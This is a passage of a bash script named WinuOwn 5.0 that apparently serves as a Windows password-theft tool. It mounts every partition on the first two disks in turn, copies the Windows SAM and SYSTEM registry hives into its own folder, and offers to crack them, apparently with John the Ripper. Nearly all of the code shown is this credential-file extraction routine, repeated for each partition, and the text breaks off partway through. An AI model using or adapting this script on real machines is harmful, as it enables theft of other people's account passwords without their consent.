#!/bin/bash

#####################################################################################################################
#                                                                                                                   #
#                     This script is written by Pierre aka Linoge, admin of Webbh4tt                                #
#  This program is open source; you can redistribute it and/or modify it under the terms of the GNU General Public  #
#                 The author bears no responsibility  for malicious or illegal use.                                 #
#                                                                                                                   #
#                                                                                                                   #
#####################################################################################################################

##########################################################################################
#                                    known bugs                                          #
# Sometimes after running the script back an forward through the menu, the menu crashes. #
#                    Please report bugs to info@webbhatt.com                             #
##########################################################################################

# ~~~~~~~~~~  Environment Setup ~~~~~~~~~~ #
    NORMAL=`echo "\033[m"`
    MENU=`echo "\033[36m"` #Blue
    NUMBER=`echo "\033[33m"` #yellow
    FGRED=`echo "\033[41m"`
    RED_TEXT=`echo "\033[31m"` #Red
    ENTER_LINE=`echo "\033[33m"`
    INTRO_TEXT=`echo "\033[32m"` #green and white text
    INFOS=`echo "\033[103;30m"` #yellow bg
    SUCCESS=`echo "\033[102;30m"` #green bg
    WARNING=`echo "\033[101;30m"` #red bg
    WARP=`echo "\033[106;30m"` #lightblue bg
    BLACK=`echo "\033[109;30m"` #SPACE bg
    END=`echo "\033[0m"`
# ~~~~~~~~~~  Environment Setup ~~~~~~~~~~ #
#info 
ver=$(echo WinuOwn_5.0)
#Author Pierre Goude
    
#################################Start script and validation####################################  

thesstart_fn()
{
mkdir /etc/WinuOwn/safe &>/dev/null
  if [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ]
then 
while true; do
echo -e "${INFOS}     WinuOwn found that you already have login files        ${END}"
echo -e "${INFOS}      in WinuOwn folder, you can crack those files          ${END}"
echo -e "${INFOS}           or load in new files from Windows                ${END}"
read -p '(crack/load)?' crack load
   case $crack in
    [cC]* ) accounts_fn
              break;;
    [lL]* ) mount_fn
              break;;
    * ) echo 'Please answer load or crack.';;
   esac
done
else 
mount_fn

  fi
}

thesstartetc_fn()
{
sudo mkdir /etc/WinuOwn/safe &>/dev/null
  if [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ]
then 
while true; do
echo -e "${INFOS}     WinuOwn found that you already have login files        ${END}"
echo -e "${INFOS}      in WinuOwn folder, you can crack those files          ${END}"
echo -e "${INFOS}           or load in new files from Windows               ${END}"
read -p '(crack/load)?' crack load
   case $crack in
    [cC]* ) accountsetc_fn
              break;;
    [lL]* ) mount_fn
              break;;
    * ) echo 'Please answer load or crack.';;
   esac
done
else 
mount_fn

  fi
}


###########################Mount partition and extract files####################################
#!/bin/bash

filecontroll()
{
if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
 if [ -d /root/.john/ ] ; then
 controll_fn
 else 
 controlletc_fn
 fi
else 
echo "" 
fi
}

mount_fn()
{
sudo rm /etc/WinuOwn/SAM && /etc/WinuOwn/SYSTEM &>/dev/null
clear
sudo mkdir /media/windows &>/dev/null
sudo umount /media/windows/ &>/dev/null
echo -e "${SUCCESS}  Scanning for Windows partitions  ${END}"
echo -e "${BLACK}                                     ${END}"

sudo mount /dev/sda0 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
then
cd /media/windows/WINDOWS/*32/*onfig
sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
sudo cp sam /etc/WinuOwn/SAM &>/dev/null
sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null    
  else
  if [ -d /media/windows/*indows/*32/*onfig/ ];
  then
  cd /media/windows/*indows/*32/*onfig/
  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null 
  else
  sudo umount /media/windows/ &>/dev/null   
  fi
fi
echo -ne '=                                                  2%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
        sudo mount /dev/sda1 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
        if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
        then
        cd /media/windows/WINDOWS/*32/*onfig
        sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
        sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
        sudo cp sam /etc/WinuOwn/SAM &>/dev/null
        sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
        sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
        sudo umount /media/windows/ &>/dev/null  	  
          else
          if [ -d /media/windows/*indows/*32/*onfig/ ];
	      then
          cd /media/windows/*indows/*32/*onfig/
          sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
          sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
          sudo cp sam /etc/WinuOwn/SAM &>/dev/null
          sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
          sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
          sudo umount /media/windows/ &>/dev/null		
          else
          sudo umount /media/windows/ &>/dev/null   
          fi
        fi
        
echo -ne '==                                                 4%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
            sudo mount /dev/sda2 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
            if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
            then
            cd /media/windows/WINDOWS/*32/*onfig
            sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
            sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
            sudo cp sam /etc/WinuOwn/SAM &>/dev/null
            sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
            sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
            sudo umount /media/windows/ &>/dev/null  	  
              else
              if [ -d /media/windows/*indows/*32/*onfig/ ];
	          then
              cd /media/windows/*indows/*32/*onfig/
              sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
              sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
              sudo cp sam /etc/WinuOwn/SAM &>/dev/null
              sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
              sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
              sudo umount /media/windows/ &>/dev/null		
              else
              sudo umount /media/windows/ &>/dev/null   
              fi
            fi
 
echo -ne '===                                                6%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi 
                sudo mount /dev/sda3 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
                if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                then
                cd /media/windows/WINDOWS/*32/*onfig
                sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                sudo umount /media/windows/ &>/dev/null  	  
                  else
                  if [ -d /media/windows/*indows/*32/*onfig/ ];
	              then
                  cd /media/windows/*indows/*32/*onfig/
                  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo umount /media/windows/ &>/dev/null		
                  else
                  sudo umount /media/windows/ &>/dev/null   
                  fi
                fi
 
echo -ne '====                                               8%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi 
                    sudo mount /dev/sda4 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
                    if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                    then
                    cd /media/windows/WINDOWS/*32/*onfig
                    sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                    sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                    sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                    sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                    sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                    sudo umount /media/windows/ &>/dev/null  	  
                      else
                      if [ -d /media/windows/*indows/*32/*onfig/ ];
	                  then
                      cd /media/windows/*indows/*32/*onfig/
                      sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                      sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                      sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                      sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                      sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                      sudo umount /media/windows/ &>/dev/null		
                      else
                      sudo umount /media/windows/ &>/dev/null   
                      fi
                    fi
 
echo -ne '=====                                              10%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi 
                        sudo mount /dev/sda5 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
                        if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                        then
                        cd /media/windows/WINDOWS/*32/*onfig
                        sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                        sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                        sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                        sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                        sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                        sudo umount /media/windows/ &>/dev/null  	  
                          else
                          if [ -d /media/windows/*indows/*32/*onfig/ ];
	                      then
                          cd /media/windows/*indows/*32/*onfig/
                          sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                          sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                          sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                          sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                          sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                          sudo umount /media/windows/ &>/dev/null		
                          else
                          sudo umount /media/windows/ &>/dev/null   
                          fi
                        fi
 
echo -ne '======                                             12%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi 
                            sudo mount /dev/sda6 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
                            if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                            then
                            cd /media/windows/WINDOWS/*32/*onfig
                            sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                            sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                            sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                            sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                            sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                            sudo umount /media/windows/ &>/dev/null  	  
                              else
                              if [ -d /media/windows/*indows/*32/*onfig/ ];
	                          then
                              cd /media/windows/*indows/*32/*onfig/
                              sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                              sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                              sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                              sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                              sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                              sudo umount /media/windows/ &>/dev/null		
                              else
                              sudo umount /media/windows/ &>/dev/null   
                              fi
                            fi
 
echo -ne '=======                                            14%\r' 
 
if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi 
                                sudo mount /dev/sda7 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
                                if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                                then
                                cd /media/windows/WINDOWS/*32/*onfig
                                sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                sudo umount /media/windows/ &>/dev/null  	  
                                  else
                                  if [ -d /media/windows/*indows/*32/*onfig/ ];
	                              then
                                  cd /media/windows/*indows/*32/*onfig/
                                  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                  sudo umount /media/windows/ &>/dev/null		
                                  else
                                  sudo umount /media/windows/ &>/dev/null   
                                  fi
                                fi
 
echo -ne '========                                           16%\r' 
 
if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi 
                                    sudo mount /dev/sda0 /media/windows/ -t vfat -o umask=000 &>/dev/null
                                    if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                                    then
                                    cd /media/windows/WINDOWS/*32/*onfig
                                    sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                    sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                    sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                    sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                    sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                    sudo umount /media/windows/ &>/dev/null  	  
                                      else
                                      if [ -d /media/windows/*indows/*32/*onfig/ ];
	                                  then
                                      cd /media/windows/*indows/*32/*onfig/
                                      sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                      sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                      sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                      sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                      sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                      sudo umount /media/windows/ &>/dev/null		
                                      else
                                      sudo umount /media/windows/ &>/dev/null   
                                      fi
                                    fi
echo -ne '=========                                          18%\r' 
 
if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                                      sudo mount /dev/sda0 /media/windows/ -t vfat -o umask=000 &>/dev/null
                                      if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                                      then
                                      cd /media/windows/WINDOWS/*32/*onfig
                                      sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                      sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                      sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                      sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                      sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                      sudo umount /media/windows/ &>/dev/null  	  
                                        else
                                        if [ -d /media/windows/*indows/*32/*onfig/ ];
	                                    then
                                        cd /media/windows/*indows/*32/*onfig/
                                        sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                        sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                        sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                        sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                        sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                        sudo umount /media/windows/ &>/dev/null		
                                        else
                                        sudo umount /media/windows/ &>/dev/null   
                                        fi
                                      fi
echo -ne '==========                                         20%\r' 
 
if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                                        sudo mount /dev/sda1 /media/windows/ -t vfat -o umask=000 &>/dev/null
                                        if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                                        then
                                        cd /media/windows/WINDOWS/*32/*onfig
                                        sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                        sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                        sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                        sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                        sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                        sudo umount /media/windows/ &>/dev/null  	  
                                          else
                                          if [ -d /media/windows/*indows/*32/*onfig/ ];
	                                      then
                                          cd /media/windows/*indows/*32/*onfig/
                                          sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                          sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                          sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                          sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                          sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                          sudo umount /media/windows/ &>/dev/null		
                                          else
                                          sudo umount /media/windows/ &>/dev/null   
                                          fi
                                        fi

echo -ne '===========                                        22%\r' 
 
if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                                          sudo mount /dev/sda2 /media/windows/ -t vfat -o umask=000 &>/dev/null
                                          if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                                          then
                                          cd /media/windows/WINDOWS/*32/*onfig
                                          sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                          sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                          sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                          sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                          sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                          sudo umount /media/windows/ &>/dev/null  	  
                                            else
                                            if [ -d /media/windows/*indows/*32/*onfig/ ];
	                                        then
                                            cd /media/windows/*indows/*32/*onfig/
                                            sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                            sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                            sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                            sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                            sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                            sudo umount /media/windows/ &>/dev/null		
                                            else
                                            sudo umount /media/windows/ &>/dev/null   
                                            fi
                                          fi
echo -ne '============                                       24%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                                            sudo mount /dev/sda3 /media/windows/ -t vfat -o umask=000 &>/dev/null
                                            if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                                            then
                                            cd /media/windows/WINDOWS/*32/*onfig
                                            sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                            sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                            sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                            sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                            sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                            sudo umount /media/windows/ &>/dev/null  	  
                                              else
                                              if [ -d /media/windows/*indows/*32/*onfig/ ];
	                                          then
                                              cd /media/windows/*indows/*32/*onfig/
                                              sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                              sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                              sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                              sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                              sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                              sudo umount /media/windows/ &>/dev/null		
                                              else
                                              sudo umount /media/windows/ &>/dev/null   
                                              fi
                                            fi
echo -ne '=============                                      26%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                                              sudo mount /dev/sda4 /media/windows/ -t vfat -o umask=000 &>/dev/null
                                              if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                                              then
                                              cd /media/windows/WINDOWS/*32/*onfig
                                              sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                              sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                              sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                              sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                              sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                              sudo umount /media/windows/ &>/dev/null  	  
                                                else
                                                if [ -d /media/windows/*indows/*32/*onfig/ ];
	                                            then
                                                cd /media/windows/*indows/*32/*onfig/
                                                sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                                sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                                sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                                sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                                sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                                sudo umount /media/windows/ &>/dev/null		
                                                else
                                                sudo umount /media/windows/ &>/dev/null   
                                                fi
                                              fi
echo -ne '==============                                     28%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                                                sudo mount /dev/sda5 /media/windows/ -t vfat -o umask=000 &>/dev/null
                                                if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                                                then
                                                cd /media/windows/WINDOWS/*32/*onfig
                                                sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                                sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                                sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                                sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                                sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                                sudo umount /media/windows/ &>/dev/null  	  
                                                  else
                                                  if [ -d /media/windows/*indows/*32/*onfig/ ];
	                                              then
                                                  cd /media/windows/*indows/*32/*onfig/
                                                  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                                  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                                  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                                  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                                  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                                  sudo umount /media/windows/ &>/dev/null		
                                                  else
                                                  sudo umount /media/windows/ &>/dev/null   
                                                  fi
                                                fi
echo -ne '===============                                    30%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                                                  sudo mount /dev/sda6 /media/windows/ -t vfat -o umask=000 &>/dev/null
                                                  if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                                                  then
                                                  cd /media/windows/WINDOWS/*32/*onfig
                                                  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                                  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                                  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                                  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                                  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                                  sudo umount /media/windows/ &>/dev/null  	  
                                                    else
                                                    if [ -d /media/windows/*indows/*32/*onfig/ ];
	                                                then
                                                    cd /media/windows/*indows/*32/*onfig/
                                                    sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                                    sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                                    sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                                    sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                                    sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                                    sudo umount /media/windows/ &>/dev/null		
                                                    else
                                                    sudo umount /media/windows/ &>/dev/null   
                                                    fi
                                                  fi

echo -ne '================                                   32%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                                                    sudo mount /dev/sda7 /media/windows/ -t vfat -o umask=000 &>/dev/null
                                                    if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                                                    then
                                                    cd /media/windows/WINDOWS/*32/*onfig
                                                    sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                                    sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                                    sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                                    sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                                    sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                                    sudo umount /media/windows/ &>/dev/null  	  
                                                      else
                                                      if [ -d /media/windows/*indows/*32/*onfig/ ];
	                                                  then
                                                      cd /media/windows/*indows/*32/*onfig/
                                                      sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                                                      sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                                                      sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                                                      sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                                                      sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                                                      sudo umount /media/windows/ &>/dev/null		
                                                      else
                                                      sudo umount /media/windows/ &>/dev/null   
                                                      fi
                                                    fi
echo -ne '==================                                 36%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
sudo mount /dev/sdb0 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
then
cd /media/windows/WINDOWS/*32/*onfig
sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
sudo cp sam /etc/WinuOwn/SAM &>/dev/null
sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null    
  else
  if [ -d /media/windows/*indows/*32/*onfig/ ];
  then
  cd /media/windows/*indows/*32/*onfig/
  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null 
  else
  sudo umount /media/windows/ &>/dev/null   
  fi
fi
echo -ne '===================                                38%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
        sudo mount /dev/sdb1 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
        if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
        then
        cd /media/windows/WINDOWS/*32/*onfig
        sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
        sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
        sudo cp sam /etc/WinuOwn/SAM &>/dev/null
        sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
        sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
        sudo umount /media/windows/ &>/dev/null  	  
          else
          if [ -d /media/windows/*indows/*32/*onfig/ ];
	      then
          cd /media/windows/*indows/*32/*onfig/
          sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
          sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
          sudo cp sam /etc/WinuOwn/SAM &>/dev/null
          sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
          sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
          sudo umount /media/windows/ &>/dev/null		
          else
          sudo umount /media/windows/ &>/dev/null   
          fi
        fi
echo -ne '====================                               40%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
            sudo mount /dev/sdb2 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
            if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
            then
            cd /media/windows/WINDOWS/*32/*onfig
            sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
            sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
            sudo cp sam /etc/WinuOwn/SAM &>/dev/null
            sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
            sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
            sudo umount /media/windows/ &>/dev/null  	  
              else
              if [ -d /media/windows/*indows/*32/*onfig/ ];
	          then
              cd /media/windows/*indows/*32/*onfig/
              sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
              sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
              sudo cp sam /etc/WinuOwn/SAM &>/dev/null
              sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
              sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
              sudo umount /media/windows/ &>/dev/null		
              else
              sudo umount /media/windows/ &>/dev/null   
              fi
            fi
echo -ne '=====================                              42%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                sudo mount /dev/sdb3 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
                if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                then
